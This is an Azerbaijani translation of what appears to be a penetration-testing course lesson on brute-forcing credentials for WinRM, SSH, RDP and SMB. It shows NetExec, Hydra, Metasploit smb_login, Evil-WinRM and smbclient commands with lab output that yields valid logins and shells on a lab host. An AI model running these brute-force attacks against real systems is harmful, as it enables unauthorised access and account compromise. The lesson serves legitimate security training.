## Şəbəkə Xidmətləri

-----

Penetrasiya testlərimiz zamanı rast gəldiyimiz hər bir kompüter şəbəkəsində məzmunu idarə etmək, redaktə etmək və ya yaratmaq üçün xidmətlər quraşdırılmışdır. Bütün bu xidmətlər müəyyən icazələrlə təmin edilir və müəyyən istifadəçilərə təyin olunur. Veb tətbiqlərdən başqa, bu xidmətlərə (lakin bunlarla məhdudlaşmayaraq) **FTP**, **SMB**, **NFS**, **IMAP/POP3**, **SSH**, **MySQL/MSSQL**, **RDP**, **WinRM**, **VNC**, **Telnet**, **SMTP** və **LDAP** daxildir.

Bu xidmətlərin bir çoxu haqqında əlavə oxumaq üçün HTB Akademiyasındakı **Footprinting** moduluna baxın.

Təsəvvür edək ki, biz şəbəkə üzərindən bir Windows serverini idarə etmək istəyirik. Buna görə də, sistemə daxil olmağa, üzərində əmrlər icra etməyə və ya məzmununa qrafik istifadəçi interfeysi (GUI) və ya terminal vasitəsilə daxil olmağa imkan verən bir xidmətə ehtiyacımız var. Bu halda, buna ən uyğun gələn ümumi xidmətlər **RDP**, **WinRM** və **SSH**-dır. SSH Windows-da o qədər də geniş yayılmasa da, Linux əsaslı sistemlər üçün aparıcı xidmətdir.

Bütün bu xidmətlərin istifadəçi adı və şifrə ilə istifadə edilən bir autentifikasiya mexanizmi var. Əlbəttə ki, bu xidmətlər yalnız əvvəlcədən təyin edilmiş açarların daxil olmaq üçün istifadə edilə biləcəyi şəkildə dəyişdirilə və konfiqurasiya edilə bilər, lakin bir çox hallarda onlar defolt (ilkin) parametrlərlə konfiqurasiya olunur.

-----

## WinRM

**Windows Remote Management** (**WinRM**) **Web Services Management Protocol** (**WS-Management**) protokolunun Microsoft tətbiqidir. Bu, Windows sistemlərinin uzaqdan idarə edilməsi üçün istifadə edilən **Simple Object Access Protocol** (**SOAP**) əsasında XML veb xidmətlərinə söykənən bir şəbəkə protokoludur. O, **Web-Based Enterprise Management** (**WBEM**) və **Windows Management Instrumentation** (**WMI**) arasında əlaqəni təmin edir, bu da **Distributed Component Object Model** (**DCOM**) protokoluna müraciət edə bilər.

Təhlükəsizlik səbəblərinə görə, WinRM Windows 10/11-də əl ilə aktivləşdirilməli və konfiqurasiya edilməlidir. Buna görə də, WinRM-dən istifadə etmək istədiyimiz bir domen və ya yerli şəbəkədəki mühitin təhlükəsizliyindən çox asılıdır. Əksər hallarda, onun təhlükəsizliyini artırmaq üçün sertifikatlardan və ya yalnız müəyyən autentifikasiya mexanizmlərindən istifadə olunur. Defolt olaraq, WinRM **TCP portları 5985 (HTTP)** və **5986 (HTTPS)** istifadə edir.

Şifrə hücumlarımız üçün istifadə edə biləcəyimiz faydalı bir alət, həmçinin SMB, LDAP, MSSQL və digər protokollar üçün də istifadə edilə bilən **NetExec**-dir. Bu alətlə tanış olmaq üçün **rəsmi sənədlərini** oxumağınızı tövsiyə edirik.

### NetExec

#### NetExec-in Quraşdırılması

**NetExec**-i `apt` ilə quraşdıra, yaxud **GitHub repozitoriyasını** klonlaşdırıb mənbədən quraşdırma və asılılıq problemlərindən qaçınma kimi müxtəlif **quraşdırma** üsullarını tətbiq edə bilərik.

```bash
nijatmansimov@htb[/htb]$ sudo apt-get -y install netexec
```

#### NetExec Menyu Seçimləri

Aləti `-h` bayrağı ilə işə salmaq bizə ümumi istifadə təlimatlarını və əlçatan olan bəzi seçimləri göstərəcəkdir.

```bash
nijatmansimov@htb[/htb]$ netexec -h
usage: netexec [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--verbose] [--debug] [--no-progress] [--log LOG] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
               [--dns-timeout DNS_TIMEOUT]
               {nfs,ftp,ssh,winrm,smb,wmi,rdp,mssql,ldap,vnc} ...

     .   .
    .|   |.     _   _          _     _____
    ||   ||    | \ | |   ___  | |_  | ____| __  __   ___    ___
    \\( )//    |  \| |  / _ \ | __| |  _|   \ \/ /  / _ \  / __|
    .=[ ]=.    | |\  | |  __/ | |_  | |___   >  <  |  __/ | (__
   / /ॱ-ॱ\ \   |_| \_|  \___|  \__| |_____| /_/\_\  \___|  \___|
   ॱ \   / ॱ
     ॱ   ॱ

    The network execution tool
    Maintained as an open source project by @NeffIsBack, @MJHallenbeck, @_zblurx
    
    For documentation and usage examples, visit: https://www.netexec.wiki/

    Version : 1.3.0
    Codename: NeedForSpeed
    Commit  : Kali Linux
    

options:
  -h, --help            show this help message and exit

Generic:
  Generic options for nxc across protocols

  --version             Display nxc version
  -t, --threads THREADS
                        set how many concurrent threads to use
  --timeout TIMEOUT     max timeout in seconds of each thread
  --jitter INTERVAL     sets a random delay between each authentication

Output:
  Options to set verbosity levels and control output

  --verbose             enable verbose output
  --debug               enable debug level information
  --no-progress         do not displaying progress bar during scan
  --log LOG             export result into a custom file

DNS:
  -6                    Enable force IPv6
  --dns-server DNS_SERVER
                        Specify DNS server (default: Use hosts file & System DNS)
  --dns-tcp             Use TCP instead of UDP for DNS queries
  --dns-timeout DNS_TIMEOUT
                        DNS query timeout in seconds

Available Protocols:
  {nfs,ftp,ssh,winrm,smb,wmi,rdp,mssql,ldap,vnc}
    nfs                 own stuff using NFS
    ftp                 own stuff using FTP
    ssh                 own stuff using SSH
    winrm               own stuff using WINRM
    smb                 own stuff using SMB
    wmi                 own stuff using WMI
    rdp                 own stuff using RDP
    mssql               own stuff using MSSQL
    ldap                own stuff using LDAP
    vnc                 own stuff using VNC
```

#### NetExec Protokola Xüsusi Yardım

Qeyd edək ki, biz müəyyən bir protokol təyin edə və bizə əlçatan olan bütün seçimlərin daha ətraflı yardım menyusunu əldə edə bilərik. NetExec hal-hazırda NFS, FTP, SSH, WinRM, SMB, WMI, RDP, MSSQL, LDAP və VNC vasitəsilə uzaqdan autentifikasiyanı dəstəkləyir.

```bash
nijatmansimov@htb[/htb]$ netexec smb -h
usage: netexec smb [-h] [--version] [-t THREADS] [--timeout TIMEOUT] [--jitter INTERVAL] [--verbose] [--debug] [--no-progress] [--log LOG] [-6] [--dns-server DNS_SERVER] [--dns-tcp]
                   [--dns-timeout DNS_TIMEOUT] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]] [-id CRED_ID [CRED_ID ...]] [--ignore-pw-decoding] [--no-bruteforce]
                   [--continue-on-success] [--gfail-limit LIMIT] [--ufail-limit LIMIT] [--fail-limit LIMIT] [-k] [--use-kcache] [--aesKey AESKEY [AESKEY ...]] [--kdcHost KDCHOST]
                   [--server {http,https}] [--server-host HOST] [--server-port PORT] [--connectback-host CHOST] [-M MODULE] [-o MODULE_OPTION [MODULE_OPTION ...]] [-L] [--options]
                   [-H HASH [HASH ...]] [--delegate DELEGATE] [--self] [-d DOMAIN | --local-auth] [--port PORT] [--share SHARE] [--smb-server-port SMB_SERVER_PORT]
                   [--gen-relay-list OUTPUT_FILE] [--smb-timeout SMB_TIMEOUT] [--laps [LAPS]] [--sam] [--lsa] [--ntds [{vss,drsuapi}]] [--dpapi [{cookies,nosystem} ...]]
                   [--sccm [{disk,wmi}]] [--mkfile MKFILE] [--pvk PVK] [--enabled] [--user USERNTDS] [--shares] [--interfaces] [--no-write-check]
                   [--filter-shares FILTER_SHARES [FILTER_SHARES ...]] [--sessions] [--disks] [--loggedon-users-filter LOGGEDON_USERS_FILTER] [--loggedon-users] [--users [USER ...]]
                   [--groups [GROUP]] [--computers [COMPUTER]] [--local-groups [GROUP]] [--pass-pol] [--rid-brute [MAX_RID]] [--wmi QUERY] [--wmi-namespace NAMESPACE] [--spider SHARE]
                   [--spider-folder FOLDER] [--content] [--exclude-dirs DIR_LIST] [--depth DEPTH] [--only-files] [--pattern PATTERN [PATTERN ...] | --regex REGEX [REGEX ...]]
                   [--put-file FILE FILE] [--get-file FILE FILE] [--append-host] [--exec-method {atexec,wmiexec,mmcexec,smbexec}] [--dcom-timeout DCOM_TIMEOUT]
                   [--get-output-tries GET_OUTPUT_TRIES] [--codec CODEC] [--no-output] [-x COMMAND | -X PS_COMMAND] [--obfs] [--amsi-bypass FILE] [--clear-obfscripts] [--force-ps32]
                   [--no-encode]
                   target [target ...]

positional arguments:
  target                the target IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets, NMap XML or .Nessus file(s)

<SNIP>
```

#### NetExec İstifadəsi

NetExec-dən istifadə üçün ümumi format aşağıdakı kimidir:

```bash
nijatmansimov@htb[/htb]$ netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```

Məsələn, bu, bir WinRM nöqtəsinə hücumun necə göründüyüdür:

```bash
nijatmansimov@htb[/htb]$ netexec winrm 10.129.42.197 -u user.list -p password.list
WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```

**(Pwn3d\!)** görünməsi, brute-force ilə tapılan istifadəçi ilə daxil olarsa, çox güman ki, sistem əmrlərini icra edə biləcəyimizə işarədir. WinRM xidməti ilə əlaqə qurmaq üçün istifadə edə biləcəyimiz başqa bir faydalı alət, WinRM xidməti ilə səmərəli əlaqə qurmağa imkan verən **Evil-WinRM**-dir.

### Evil-WinRM

#### Evil-WinRM-in Quraşdırılması

```bash
nijatmansimov@htb[/htb]$ sudo gem install evil-winrm
Fetching little-plugger-1.1.4.gem
Fetching rubyntlm-0.6.3.gem
Fetching builder-3.2.4.gem
Fetching logging-2.3.0.gem
Fetching gyoku-1.3.1.gem
Fetching nori-2.6.0.gem
Fetching gssapi-1.3.1.gem
Fetching erubi-1.10.0.gem
Fetching evil-winrm-3.3.gem
Fetching winrm-2.3.6.gem
Fetching winrm-fs-1.3.5.gem
Happy hacking! :)
```

#### Evil-WinRM İstifadəsi

```bash
nijatmansimov@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
```

```bash
nijatmansimov@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
Evil-WinRM shell v3.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\user\Documents>
```

Əgər daxilolma uğurlu olarsa, əməliyyatı və əmrlərin icrasını sadələşdirən **Powershell Remoting Protocol** (**MS-PSRP**) istifadə edərək bir terminal seansı başladılır.

-----

## SSH

**Secure Shell** (**SSH**) uzaq bir hosta qoşulmaq, sistem əmrlərini icra etmək və ya bir hostdan serverə faylları ötürmək üçün daha təhlükəsiz bir yoldur. SSH serveri defolt olaraq **TCP port 22** üzərində işləyir, biz isə ona bir SSH klienti istifadə edərək qoşula bilərik. Bu xidmət üç fərqli kriptoqrafiya əməliyyatı/metodu istifadə edir: **simmetrik** şifrələmə, **asimmetrik** şifrələmə və **hashing** (heşləmə).

### Simmetrik Şifrələmə

Simmetrik şifrələmə şifrələmə və şifrənin açılması üçün **eyni açarı** istifadə edir. Açarə çıxışı olan hər kəs ötürülən məlumatlara da çıxış əldə edə bilər. Buna görə də, təhlükəsiz simmetrik şifrələmə üçün bir açar mübadiləsi proseduruna ehtiyac var. Bunun üçün **Diffie-Hellman açar mübadiləsi** metodu istifadə olunur. Əgər üçüncü tərəf açarı əldə etsə belə, mesajları deşifrə edə bilməz, çünki açar mübadiləsi metodu naməlumdur. Lakin, bu, məlumatlara daxil olmaq üçün lazım olan gizli açarı müəyyənləşdirmək üçün server və klient tərəfindən istifadə olunur. AES, Blowfish, 3DES və s. kimi simmetrik şifrələmə sisteminin bir çox müxtəlif variantları istifadə edilə bilər.

### Asimmetrik Şifrələmə

Asimmetrik şifrələmə **iki açar** istifadə edir: bir **xüsusi açar** və bir **ictimai açar**. Xüsusi açar gizli qalmalıdır, çünki yalnız o, ictimai açarla şifrələnmiş mesajları deşifrə edə bilər. Əgər bir hücumçu, tez-tez şifrə ilə qorunmayan xüsusi açarı əldə edərsə, etimadnamə olmadan sistemə daxil ola bilər. Bir əlaqə qurulduqdan sonra, server başlanğıc və autentifikasiya üçün ictimai açarı istifadə edir. Əgər klient mesajı deşifrə edə bilirsə, onun xüsusi açarı var və SSH seansı başlaya bilər.

### Hashing (Heşləmə)

Heşləmə metodu ötürülən məlumatları başqa bir unikal dəyərə çevirir. SSH mesajların həqiqiliyini təsdiqləmək üçün heşləmə istifadə edir. Bu, yalnız bir istiqamətdə işləyən riyazi bir alqoritmdir.

### Hydra - SSH

SSH-a brute force hücumu etmək üçün **Hydra** kimi bir alət istifadə edə bilərik. Bu, **Login Brute Forcing** modulunda ətraflı şəkildə əhatə olunur.

```bash
nijatmansimov@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries (l:5/p:5), ~2 tries per task
[DATA] attacking ssh://10.129.42.197:22/
[22][ssh] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

SSH protokolu vasitəsilə sistemə daxil olmaq üçün, əksər Linux paylamalarında defolt olaraq mövcud olan OpenSSH klientindən istifadə edə bilərik.

```bash
nijatmansimov@htb[/htb]$ ssh user@10.129.42.197
The authenticity of host '10.129.42.197 (10.129.42.197)' can't be established.
ECDSA key fingerprint is SHA256:MEuKMmfGSRuv2Hq+e90MZzhe4lHhwUEo4vWHOUSv7Us.


Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Warning: Permanently added '10.129.42.197' (ECDSA) to the list of known hosts.


user@10.129.42.197's password: ********

Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

user@WINSRV C:\Users\user>
```

-----

## Remote Desktop Protocol (RDP)

Microsoft-un **Remote Desktop Protocol** (**RDP**) defolt olaraq **TCP port 3389** vasitəsilə Windows sistemlərinə uzaqdan girişi təmin edən bir şəbəkə protokoludur. RDP həm istifadəçilərə, həm də administratorlara/dəstək heyətinə bir təşkilat daxilində Windows hostlarına uzaqdan giriş imkanı verir. Remote Desktop Protocol bir əlaqə üçün iki iştirakçını müəyyənləşdirir: əsl işin baş verdiyi terminal serveri və terminal serverinin uzaqdan idarə edildiyi terminal klienti. Şəkil, səs, klaviatura və göstərici cihazının mübadiləsinə əlavə olaraq, RDP həmçinin terminal serverinin sənədlərini terminal klientinə qoşulmuş bir printerdə çap edə bilər və ya orada mövcud olan yaddaş mühitlərinə girişi təmin edə bilər. Texniki olaraq, RDP IP yığınında bir tətbiq qat protokoludur və məlumat ötürülməsi üçün TCP və UDP istifadə edə bilər. Protokol müxtəlif rəsmi Microsoft tətbiqləri tərəfindən istifadə olunur, lakin bəzi üçüncü tərəf həllərində də istifadə edilir.

### Hydra - RDP

RDP brute-force hücumu üçün də **Hydra**-nı istifadə edə bilərik.

```bash
nijatmansimov@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:40
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[DATA] max 4 tasks per 1 server, overall 4 tasks, 25 login tries (l:5/p:5), ~7 tries per task
[DATA] attacking rdp://10.129.42.197:3389/
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: mrb3n password: rockstar, continuing attacking the account.
[3389][rdp] account on 10.129.42.197 might be valid but account not active for remote desktop: login: cry0l1t3 password: delta, continuing attacking the account.
[3389][rdp] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid password found
```

Linux, RDP protokolu istifadə edərək istənilən serverlə əlaqə qurmaq üçün müxtəlif klientlər təklif edir. Bunlara **Remmina**, **xfreerdp** və bir çox başqaları daxildir. Məqsədlərimiz üçün **xfreerdp** ilə işləyəcəyik.

### xFreeRDP

```bash
xfreerdp /v:<target-IP> /u:<username> /p:<password>
```

```bash
nijatmansimov@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password
<SNIP>

New Certificate details:
        Common Name: WINSRV
        Subject:     CN = WINSRV
        Issuer:      CN = WINSRV
        Thumbprint:  cd:91:d0:3e:7f:b7:bb:40:0e:91:45:b0:ab:04:ef:1e:c8:d5:41:42:49:e0:0c:cd:c7:dd:7d:08:1f:7c:fe:eb

Do you trust the above certificate? (Y/T/N) Y
```

<img width="1019" height="795" alt="image" src="https://github.com/user-attachments/assets/bc3db32c-53d1-46ec-ace4-46dce283e2b3" />

## SMB

**Server Message Block** (**SMB**) yerli şəbəkələrdə bir klient və server arasında məlumat ötürülməsinə cavabdeh olan bir protokoldur. O, Windows şəbəkələrində fayl və qovluq paylaşımı və çap xidmətlərini tətbiq etmək üçün istifadə olunur. SMB tez-tez bir fayl sistemi kimi qeyd olunur, lakin o, fayl sistemi deyil. SMB yerli şəbəkələrdə diskləri təmin etmək üçün Unix və Linux üçün **NFS** ilə müqayisə edilə bilər.

SMB həmçinin **Common Internet File System** (**CIFS**) kimi tanınır. Bu, SMB protokolunun bir hissəsidir və Windows, Linux və ya macOS kimi çoxsaylı platformaların universal uzaqdan qoşulmasını təmin edir. Bundan əlavə, biz yuxarıda qeyd olunan funksiyaların açıq mənbə tətbiqi olan **Samba**-ya tez-tez rast gələcəyik. SMB üçün də, fərqli şifrələrlə birlikdə fərqli istifadəçi adlarını yoxlamaq üçün yenidən **hydra**-nı istifadə edə bilərik.

### Hydra - SMB

```bash
nijatmansimov@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:37:31
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[445][smb] host: 10.129.42.197   login: user   password: password
1 of 1 target successfully completed, 1 valid passwords found
```

Lakin, serverin etibarsız cavab göndərdiyini təsvir edən aşağıdakı xətanı da ala bilərik.

### Hydra - Xəta

```bash
nijatmansimov@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:13
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 25 login tries (l:5236/p:4987234), ~25 tries per task
[DATA] attacking smb://10.129.42.197:445/
[ERROR] invalid reply from target smb://10.129.42.197:445/
```

Bunun səbəbi, çox güman ki, SMBv3 cavablarını idarə edə bilməyən köhnəlmiş bir THC-Hydra versiyamızın olmasıdır. Bu problemi aşmaq üçün, **hydra**-nı əl ilə yeniləyə və yenidən tərtib edə və ya başqa bir çox güclü alət olan **Metasploit framework**-dən istifadə edə bilərik.

### Metasploit Framework

```bash
nijatmansimov@htb[/htb]$ msfconsole -q
msf6 > use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_login) > options 

Module options (auxiliary/scanner/smb/smb_login):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   ABORT_ON_LOCKOUT   false            yes       Abort the run when an account lockout is detected
   BLANK_PASSWORDS    false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED   5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS       false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS        false            no        Add all passwords in the current database to the list
   DB_ALL_USERS       false            no        Add all users in the current database to the list
   DB_SKIP_EXISTING   none             no        Skip existing credentials stored in the current database (Accepted: none, user, user&realm)
   DETECT_ANY_AUTH    false            no        Enable detection of systems accepting any authentication
   DETECT_ANY_DOMAIN  false            no        Detect if domain is required for the specified user
   PASS_FILE                           no        File containing passwords, one per line
   PRESERVE_DOMAINS   true             no        Respect a username that contains a domain name.
   Proxies                             no        A proxy chain of format type:host:port[,type:host:port][...]
   RECORD_GUEST       false            no        Record guest-privileged random logins to the database
   RHOSTS                              yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT              445              yes       The SMB service port (TCP)
   SMBDomain          .                no        The Windows domain to use for authentication
   SMBPass                             no        The password for the specified username
   SMBUser                             no        The username to authenticate as
   STOP_ON_SUCCESS    false            yes       Stop guessing when a credential works for a host
   THREADS            1                yes       The number of concurrent threads (max one per host)
   USERPASS_FILE                       no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS       false            no        Try the username as the password for all users
   USER_FILE                           no        File containing usernames, one per line
   VERBOSE            true             yes       Whether to print output for all attempts


msf6 auxiliary(scanner/smb/smb_login) > set user_file user.list

user_file => user.list


msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list

pass_file => password.list


msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.42.197

rhosts => 10.129.42.197

msf6 auxiliary(scanner/smb/smb_login) > run

[+] 10.129.42.197:445     - 10.129.42.197:445 - Success: '.\user:password'
[*] 10.129.42.197:445     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

İndi mövcud paylaşımları və onlar üçün hansı imtiyazlara malik olduğumuzu görmək üçün yenidən **NetExec**-dən istifadə edə bilərik.

### NetExec

```bash
nijatmansimov@htb[/htb]$ netexec smb 10.129.42.197 -u "user" -p "password" --shares
SMB         10.129.42.197   445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
SMB         10.129.42.197   445    WINSRV           [+] WINSRV\user:password 
SMB         10.129.42.197   445    WINSRV           [+] Enumerated shares
SMB         10.129.42.197   445    WINSRV           Share           Permissions     Remark
SMB         10.129.42.197   445    WINSRV           -----           -----------     ------
SMB         10.129.42.197   445    WINSRV           ADMIN$                          Remote Admin
SMB         10.129.42.197   445    WINSRV           C$                              Default share
SMB         10.129.42.197   445    WINSRV           SHARENAME       READ,WRITE      
SMB         10.129.42.197   445    WINSRV           IPC$            READ            Remote IPC
```

SMB vasitəsilə serverlə əlaqə qurmaq üçün, məsələn, **smbclient** alətindən istifadə edə bilərik. Bu alət, imtiyazlarımız imkan verərsə, paylaşımların məzmununu görməyə, faylları yükləməyə və ya endirməyə imkan verəcək.

### Smbclient

```bash
nijatmansimov@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
Enter WORKGROUP\user's password: *******

Try "help" to get a list of possible commands.


smb: \> ls
  .                                  DR        0  Thu Jan  6 18:48:47 2022
  ..                                 DR        0  Thu Jan  6 18:48:47 2022
  desktop.ini                       AHS      282  Thu Jan  6 15:44:52 2022

                10328063 blocks of size 4096. 6074274 blocks available
smb: \> 
```

Çağırış suallarını tamamlamaq üçün əlavə edilmiş **network-services.zip** arxivindən wordlistləri (söz siyahılarını) endirdiyinizdən əmin olun. **Bəzi tapşırıqların VPN üzərindən daha uzun çəkdiyi üçün hücumlarınızı Pwnbox-dan həyata keçirməyiniz şiddətlə tövsiyə olunur.**
